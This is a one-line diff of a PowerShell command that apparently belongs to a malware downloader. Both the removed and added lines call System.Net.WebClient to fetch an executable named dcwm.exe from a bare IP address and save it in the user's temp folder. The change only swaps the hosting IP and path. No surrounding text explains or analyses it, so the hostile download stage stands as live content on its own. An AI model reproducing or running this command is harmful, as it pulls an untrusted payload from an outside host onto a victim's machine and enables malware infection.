@@ -1,1 +1,1 @@
-(New-Object System.Net.WebClient).DownloadFile("http://163.172.144.82/ex/dcwm.exe","$env:temp\dcwm.exe");
+(New-Object System.Net.WebClient).DownloadFile("http://23.106.160.239/dcwm.exe","$env:temp\dcwm.exe");
